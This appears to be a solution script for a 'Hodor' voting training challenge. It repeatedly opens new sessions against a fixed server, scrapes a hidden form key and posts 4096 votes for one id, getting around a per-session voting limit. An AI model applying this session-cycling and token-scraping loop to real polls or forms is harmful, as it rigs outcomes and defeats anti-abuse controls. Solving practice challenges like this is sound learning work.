#!/usr/bin/python3
#task1 voting 4096 times
""" Hodor Voting Contest """
import requests
from bs4 import BeautifulSoup

url = "http://158.69.76.135/level1.php"
form = {
        "id": "3866",
        "holdthedoor": "Submit",
        "key": ""
        }
crash = 0

if __name__ == "__main__":
    for i in range(0, 4096):
        session = requests.session()
        page = session.get(url)
        content = page.content
        soup = BeautifulSoup(content, "html.parser")
        inputs = soup.find_all('input')
        for line in inputs:
            if line.get('name') == "key":
                key = line.get('value')

        form["key"] = key 

        result = session.post(url, data=form)
        if result.status_code != 200:
            print("Failed to post request number {}".format(i))
            crash += 1
    print("Failed {} requests".format(crash))
